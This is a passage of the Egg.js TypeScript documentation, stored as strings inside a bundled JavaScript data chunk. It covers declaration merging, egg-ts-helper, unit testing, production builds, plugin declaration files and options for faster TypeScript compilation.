`,paraId:42,tocIndex:12},{value:"Due to the automatic loading mechanism, TS cannot analyze dependencies in static or relationship intellisense.",paraId:43,tocIndex:13},{value:"Luckily, TS has many tricks to cope with it. We can use ",paraId:44,tocIndex:13},{value:"Declaration Merging",paraId:44,tocIndex:13},{value:" to write ",paraId:44,tocIndex:13},{value:"d.ts",paraId:44,tocIndex:13},{value:" as a helper.",paraId:44,tocIndex:13},{value:"E.g: ",paraId:45,tocIndex:13},{value:"app/service/news.ts",paraId:45,tocIndex:13},{value:" will automatically load ",paraId:45,tocIndex:13},{value:"ctx.service.news",paraId:45,tocIndex:13},{value:" and recognize it, if you write like this below:",paraId:45,tocIndex:13},{value:`// typings/app/service/index.d.ts
import News from '../../../app/service/News';

declare module 'egg' {
  interface IService {
    news: News;
  }
}
`,paraId:46,tocIndex:13},{value:"It's a bit too bothering to write them manually, so we offer you a tool ",paraId:47,tocIndex:13},{value:"egg-ts-helper",paraId:47,tocIndex:13},{value:", with which we can analyze and generate ",paraId:47,tocIndex:13},{value:"d.ts",paraId:47,tocIndex:13},{value:" files automatically.",paraId:47,tocIndex:13},{value:"What we do is just to do some configs in ",paraId:48,tocIndex:13},{value:"package.json",paraId:48,tocIndex:13},{value:":",paraId:48,tocIndex:13},{value:`{
  "egg": {
    "declarations": true
  },
  "scripts": {
    "dev": "egg-bin dev",
    "test-local": "egg-bin test",
    "clean": "ets clean"
  }
}
`,paraId:49,tocIndex:13},{value:"The corresponding ",paraId:50,tocIndex:13},{value:"d.ts",paraId:50,tocIndex:13},{value:" files are automatically generated in ",paraId:50,tocIndex:13},{value:"typings/{app,config}/",paraId:50,tocIndex:13},{value:" during the developing period. ",paraId:50,tocIndex:13},{value:"DO NOT modify manually in case of being overwritten",paraId:50,tocIndex:13},{value:".",paraId:50,tocIndex:13},{value:"The tool nowadays can support egg projects in ts and js with intellisenses.",paraId:51,tocIndex:13},{value:"Unit Test is a MUST in development:",paraId:52,tocIndex:14},{value:`// test/app/service/news.test.ts
import assert from 'assert';
import { Context } from 'egg';
import { app } from 'egg-mock/bootstrap';

describe('test/app/service/news.test.js', () => {
  let ctx: Context;

  before(async () => {
    ctx = app.mockContext();
  });

  it('list()', async () => {
    const list = await ctx.service.news.list();
    assert(list.length === 30);
  });
});
`,paraId:53,tocIndex:14},{value:"Run commands as what you do before, and we've built ",paraId:54,tocIndex:14},{value:"Error stacks and coverages",paraId:54,tocIndex:14},{value:" in.",paraId:54,tocIndex:14},{value:`{
  "name": "showcase",
  "egg": {
    "declarations": true
  },
  "scripts": {
    "test": "npm run lint -- --fix && npm run test-local",
    "test-local": "egg-bin test",
    "cov": "egg-bin cov",
    "lint": "tslint ."
  }
}
`,paraId:55,tocIndex:14},{value:"There's no main difference for debugging in TS, it can reach correct positions through ",paraId:56,tocIndex:15},{value:"sourcemap",paraId:56,tocIndex:15},{value:".",paraId:56,tocIndex:15},{value:`{
  "name": "showcase",
  "egg": {
    "declarations": true
  },
  "scripts": {
    "debug": "egg-bin debug",
    "debug-test": "npm run test-local -- --inspect"
  }
}
`,paraId:57,tocIndex:15},{value:"Debugging in VSCode",paraId:58,tocIndex:15},{value:"History of Debugging Egg in VSCode",paraId:58,tocIndex:15},{value:"In a PROD env, we tend to build ts to js, and recommend to build on ",paraId:59,tocIndex:17},{value:"ci",paraId:59,tocIndex:17},{value:" and make packages.",paraId:59,tocIndex:17},{value:"Configs in ",paraId:60,tocIndex:17},{value:"package.json",paraId:60,tocIndex:17},{value:" :",paraId:60,tocIndex:17},{value:`{
  "devDependencies": {
    "@eggjs/tsconfig": "^1.0.0"
  },
  "egg": {
    "typescript": true,
    "declarations": true
  },
  "scripts": {
    "start": "egg-scripts start --title=egg-server-showcase",
    "stop": "egg-scripts stop --title=egg-server-showcase",
    "tsc": "ets && tsc -p tsconfig.json",
    "ci": "npm run lint && npm run cov && npm run tsc",
    "clean": "ets clean"
  }
}
`,paraId:61,tocIndex:17},{value:"And the corresponding ",paraId:62,tocIndex:17},{value:"tsconfig.json",paraId:62,tocIndex:17},{value:":",paraId:62,tocIndex:17},{value:`{
  "extends": "@eggjs/tsconfig",
  "exclude": ["app/public", "app/web", "app/views"]
}
`,paraId:63,tocIndex:17},{value:"Notice: When ts and js files are with the same name, egg will first load js ones. So during the development period, ",paraId:64,tocIndex:17},{value:"egg-ts-helper",paraId:64,tocIndex:17},{value:" will be automatically called to clear up all the js files with the same names, of course you can use ",paraId:64,tocIndex:17},{value:"npm run clean",paraId:64,tocIndex:17},{value:" to clear them manually.",paraId:64,tocIndex:17},{value:"Codes online are js after compilation, however what we expect is to see error stacks pointing at TS source codes. So:",paraId:65,tocIndex:18},{value:"When buiding the project, we should insert info of ",paraId:66,tocIndex:18},{value:"sourcemap",paraId:66,tocIndex:18},{value:" in ",paraId:66,tocIndex:18},{value:"inlineSourceMap: true",paraId:66,tocIndex:18},{value:".",paraId:66,tocIndex:18},{value:"For developers, there's no need to worry about correcting the positions to the right error stacks in a built-in ",paraId:66,tocIndex:18},{value:"egg-scripts",paraId:66,tocIndex:18},{value:".",paraId:66,tocIndex:18},{value:"For more detailed info:",paraId:67,tocIndex:18},{value:"https://zhuanlan.zhihu.com/p/26267678",paraId:68,tocIndex:18},{value:"https://github.com/eggjs/egg-scripts/pull/19",paraId:68,tocIndex:18},{value:"Principles:",paraId:69,tocIndex:19},{value:"DO NOT recommend to develop plugin/framework in TS directly, we should publish them in js to npm.",paraId:70,tocIndex:19},{value:"When you write a plugin/framework, the corresponding ",paraId:70,tocIndex:19},{value:"index.d.ts",paraId:70,tocIndex:19},{value:" should be included.",paraId:70,tocIndex:19},{value:"By ",paraId:70,tocIndex:19},{value:"Declaration Merging",paraId:70,tocIndex:19},{value:" we can inject the functions of plugin/framework into Egg.",paraId:70,tocIndex:19},{value:"All are mounted on ",paraId:70,tocIndex:19},{value:"egg",paraId:70,tocIndex:19},{value:" module, DO NOT use the outer layer.",paraId:70,tocIndex:19},{value:"Styles can be referred from the automatically generated ",paraId:71,tocIndex:20},{value:"egg-ts-helper",paraId:71,tocIndex:20},{value:":",paraId:71,tocIndex:20},{value:`// {plugin_root}/index.d.ts

import 'egg';
import News from '../../../app/service/News';

declare module 'egg' {
  // extended service
  interface IService {
    news: News;
  }

  // extended app
  interface Application {}

  // extended context
  interface Context {}

  // extended your own configs
  interface EggAppConfig {}

  // extend customize env
  type EggEnvType = 'local' | 'unittest' | 'prod' | 'sit';
}
`,paraId:72,tocIndex:20},{value:"Definitions:",paraId:73,tocIndex:21},{value:`// {framework_root}/index.d.ts

import * as Egg from 'egg';

// With 'import' to include the outer framework's plugin.
import 'my-plugin';

declare module 'egg' {
  // Extend egg like plugin...
}

// Export the whole Egg
export = Egg;
`,paraId:74,tocIndex:21},{value:"For developers, they can directly import your framework:",paraId:75,tocIndex:21},{value:`// app/service/news.ts

// Developers can get all intellisense after they import your framework
import { Service } from 'duck-egg';

export default class NewsService extends Service {
  public async list(page?: number): Promise<NewsItem[]> {
    return [];
  }
}
`,paraId:76,tocIndex:21},{value:"Here're some questions asked by many people with answers one by one:",paraId:77,tocIndex:22},{value:"ts",paraId:78},{value:"npm start",paraId:78},{value:"npm start",paraId:79,tocIndex:23},{value:" actually runs ",paraId:79,tocIndex:23},{value:"egg-scripts start",paraId:79,tocIndex:23},{value:", however we ONLY integrate ",paraId:79,tocIndex:23},{value:"ts-node",paraId:79,tocIndex:23},{value:" in our ",paraId:79,tocIndex:23},{value:"egg-bin",paraId:79,tocIndex:23},{value:", it means ts won'be loaded until we use ",paraId:79,tocIndex:23},{value:"egg-bin",paraId:79,tocIndex:23},{value:".",paraId:79,tocIndex:23},{value:"egg-scripts",paraId:80,tocIndex:23},{value:" is the cli for PROD, and we suggest you compiling all the ts to js before running because of robustness and capbility. That's the reason why we don't suggest you using ",paraId:80,tocIndex:23},{value:"ts-node",paraId:80,tocIndex:23},{value:" to run the application in PROD.",paraId:80,tocIndex:23},{value:"On the contrary, ",paraId:81,tocIndex:23},{value:"ts-node",paraId:81,tocIndex:23},{value:" can reduce the cost of management for compiled files from ",paraId:81,tocIndex:23},{value:"tsc",paraId:81,tocIndex:23},{value:"in DEV, and the performance loss can almost be ignored, so ",paraId:81,tocIndex:23},{value:"ts-node",paraId:81,tocIndex:23},{value:" is integrated into ",paraId:81,tocIndex:23},{value:"egg-bin",paraId:81,tocIndex:23},{value:".",paraId:81,tocIndex:23},{value:"In summary: Please use ",paraId:82,tocIndex:23},{value:"tsc",paraId:82,tocIndex:23},{value:"to compile all ts files into js through ",paraId:82,tocIndex:23},{value:"npm run tsc",paraId:82,tocIndex:23},{value:", and then run ",paraId:82,tocIndex:23},{value:"npm start",paraId:82,tocIndex:23},{value:".",paraId:82,tocIndex:23},{value:"There're mainly two reasons causing this problem:",paraId:83,tocIndex:24},{value:"1. No related defination ",paraId:84,tocIndex:24},{value:"d.ts",paraId:84,tocIndex:24},{value:" file for the plugin",paraId:84,tocIndex:24},{value:"If you want to load some object into egg, you MUST follow the ",paraId:85,tocIndex:24},{value:"Plugin / Framework Development Instructions",paraId:85,tocIndex:24},{value:" below by making a declaration file into your own plugin.",paraId:85,tocIndex:24},{value:"You can also create a new declaration file to solve this problem when you are eager to deploy to PROD. Suppose I'm using the plugin of ",paraId:86,tocIndex:24},{value:"egg-dashboard",paraId:86,tocIndex:24},{value:" and it has a loading object in egg's app without any declarations, so if you directly use ",paraId:86,tocIndex:24},{value:"app.dashboard",paraId:86,tocIndex:24},{value:", there'll be a type error occuring, and you want to solve it eagerly, you can create ",paraId:86,tocIndex:24},{value:"index.d.ts",paraId:86,tocIndex:24},{value:" in 'typings' by writing this following:",paraId:86,tocIndex:24},{value:`// typings/index.d.ts

import 'egg';

declare module 'egg' {
  interface Application {
    dashboard: any;
  }
}
`,paraId:87,tocIndex:24},{value:"Now it's solved! Of course your PRs for plugins without declaration files are welcomed to help others!",paraId:88,tocIndex:24},{value:"2. egg's plugin has the declaration but not loaded",paraId:89,tocIndex:24},{value:"If the egg's plugin has the right declaration, we need to import it exclipitly and ts can load the related object.",paraId:90,tocIndex:24},{value:"If you use ",paraId:91,tocIndex:24},{value:"egg-ts-helper",paraId:91,tocIndex:24},{value:", it will automatically generate the exclipit importing declarations according to what plugins you've enabled in the application. If you don't use that, you have to import the declaration of plugins manually.",paraId:91,tocIndex:24},{value:`// typings/index.d.ts

import 'egg-dashboard';
`,paraId:92,tocIndex:24},{value:"Notice: You MUST use 'import' in ",paraId:93,tocIndex:24},{value:"d.ts",paraId:93,tocIndex:24},{value:", because most of egg's plugins are without main entry points. There'll be errors occuring if you import directly in ts.",paraId:93,tocIndex:24},{value:"paths",paraId:78},{value:"tsconfig.json",paraId:78},{value:"Strictly speaking, this has nothing to do with egg but with many people's questions, and we'll give our answer to it. The reason is ",paraId:94,tocIndex:25},{value:"tsc",paraId:94,tocIndex:25},{value:" WON'T convert the import path when compiling ts to js, so when you config ",paraId:94,tocIndex:25},{value:"paths",paraId:94,tocIndex:25},{value:" in ",paraId:94,tocIndex:25},{value:"tsconfig.json",paraId:94,tocIndex:25},{value:" and if you use ",paraId:94,tocIndex:25},{value:"paths",paraId:94,tocIndex:25},{value:" to import the related modules, you are running the high risk that you cannot find them when compiled to js.",paraId:94,tocIndex:25},{value:"The solution is either you don't use ",paraId:95,tocIndex:25},{value:"paths",paraId:95,tocIndex:25},{value:", or you can ONLY import some declarations instead of detailed values. Another way is that you can use ",paraId:95,tocIndex:25},{value:"tsconfig-paths",paraId:95,tocIndex:25},{value:" to hook the process logic in node's path module to support ",paraId:95,tocIndex:25},{value:"paths",paraId:95,tocIndex:25},{value:" in ",paraId:95,tocIndex:25},{value:"tsconfig.json",paraId:95,tocIndex:25},{value:".",paraId:95,tocIndex:25},{value:"You can directly import ",paraId:96,tocIndex:25},{value:"tsconfig-paths",paraId:96,tocIndex:25},{value:" in ",paraId:96,tocIndex:25},{value:"config/plugin.ts",paraId:96,tocIndex:25},{value:", because ",paraId:96,tocIndex:25},{value:"plugin.ts",paraId:96,tocIndex:25},{value:" is ALWAYS loaded firstly in both App and Agent.",paraId:96,tocIndex:25},{value:`// config/plugin.ts

import 'tsconfig-paths/register';

...
`,paraId:97,tocIndex:25},{value:"Many contributors don't know how to write unit tests for their plugin's declaration files, so we also have a discussion about it here:",paraId:98,tocIndex:26},{value:"When you finish writing a declaration for an egg's plugin, you can write your own application in ",paraId:99,tocIndex:26},{value:"test/fixures",paraId:99,tocIndex:26},{value:" (you can refer ",paraId:99,tocIndex:26},{value:"https://github.com/eggjs/egg-view/tree/master/test/fixtures/apps/ts",paraId:99,tocIndex:26},{value:"). Do remember to add ",paraId:99,tocIndex:26},{value:"paths",paraId:99,tocIndex:26},{value:"configs into ",paraId:99,tocIndex:26},{value:"tsconfig.json",paraId:99,tocIndex:26},{value:" to do imports in the fixture. Take ",paraId:99,tocIndex:26},{value:"egg-view",paraId:99,tocIndex:26},{value:" as an example:",paraId:99,tocIndex:26},{value:`    "paths": {
      "egg-view": ["../../../../"]
    }
`,paraId:100,tocIndex:26},{value:"Do remember DO NOT CONFIG ",paraId:101,tocIndex:26},{value:'"skipLibCheck": true',paraId:101,tocIndex:26},{value:" in the ",paraId:101,tocIndex:26},{value:"tsconfig.json",paraId:101,tocIndex:26},{value:", and if you set it to true, ",paraId:101,tocIndex:26},{value:"tsc",paraId:101,tocIndex:26},{value:"will ignore the type checks when compiling, and there's no meaning for unit tests for your plugin's declarations.",paraId:101,tocIndex:26},{value:"In the end, add a test case to check whether your declaration works properly or not. See ",paraId:102,tocIndex:26},{value:"egg-view",paraId:102,tocIndex:26},{value:" example below:",paraId:102,tocIndex:26},{value:`describe('typescript', () => {
  it('should compile ts without error', () => {
    return (
      coffee
        .fork(require.resolve('typescript/bin/tsc'), [
          '-p',
          path.resolve(__dirname, './fixtures/apps/ts/tsconfig.json'),
          '--noEmit',
        ])
        // .debug()
        .expect('code', 0)
        .end()
    );
  });
});
`,paraId:103,tocIndex:26},{value:"Some other unit test projects as your references:",paraId:104,tocIndex:26},{value:"https://github.com/eggjs/egg",paraId:105,tocIndex:26},{value:"https://github.com/eggjs/egg-view",paraId:105,tocIndex:26},{value:"https://github.com/eggjs/egg-logger",paraId:105,tocIndex:26},{value:`According to our practice, ts-node is a better solution nowaday because we don't execute
tsc in a new terminal, and we can accept the start speed (only for ts-node@7, because the
new version has removed the cache and it makes the speed too slow (`,paraId:106,tocIndex:27},{value:"#754",paraId:106,tocIndex:27},{value:"), so that's why we don't upgrade it).",paraId:106,tocIndex:27},{value:`But if your project is extreamly huge, ts-node's performance will be tight as well.
So here're our optimizations for you:`,paraId:107,tocIndex:27},{value:`Most of time in compilation is type checking, so if we close it there'll be
a bit improvements for performance, with the environment variable
`,paraId:108,tocIndex:28},{value:"TS_NODE_TRANSPILE_ONLY=true",paraId:108,tocIndex:28},{value:" when starting your app. E.g:",paraId:108,tocIndex:28},{value:`$ TS_NODE_TRANSPILE_ONLY=true egg-bin dev
`,paraId:109,tocIndex:28},{value:'Or you can just make tscompiler as the "Compiling-Only" for tscompiler.',paraId:110,tocIndex:28},{value:`// package.json
{
  "name": "demo",
  "egg": {
    "typescript": true,
    "declarations": true,
    "tscompiler": "ts-node/register/transpile-only"
  }
}
`,paraId:111,tocIndex:28},{value:`Besides ts-node, There're also many projects supporting ts compilation,
such as esbuild, we can install it first `,paraId:112,tocIndex:29},{value:"esbuild-register",paraId:112,tocIndex:29},{value:`$ npm install esbuild-register --save-dev
`,paraId:113,tocIndex:29},{value:"And then config ",paraId:114,tocIndex:29},{value:"tscompiler",paraId:114,tocIndex:29},{value:" like this:",paraId:114,tocIndex:29},{value:`// package.json
{
  "name": "demo",
  "egg": {
    "typescript": true,
    "declarations": true,
    "tscompiler": "esbuild-register"
  }
}
`,paraId:115,tocIndex:29},{value:`Then you can use esbuild-register to compile (notice: esbulild-register can't
do typecheck).`,paraId:116,tocIndex:29},{value:"Same for swc, if you want to use it after installation ",paraId:117,tocIndex:29},{value:"@swc-node/register",paraId:117,tocIndex:29},{value:", and then config in tscompiler.",paraId:117,tocIndex:29},{value:`If you still cannot bear the speed of the dynamic compilation, you can directly
use tsc. This means you don't need to config typescript to true in package.json,
but just start a new terminal to execute tsc.`,paraId:118,tocIndex:30},{value:`$ tsc -w
`,paraId:119,tocIndex:30},{value:"And then start the egg.",paraId:120,tocIndex:30},{value:`$ egg-bin dev
`,paraId:121,tocIndex:30},{value:"We suggest you can add configs for ",paraId:122,tocIndex:30},{value:"**/*.js",paraId:122,tocIndex:30},{value:` at .gitignore to avoid
submitting the generated js files to the remote.`,paraId:122,tocIndex:30}]}}]);
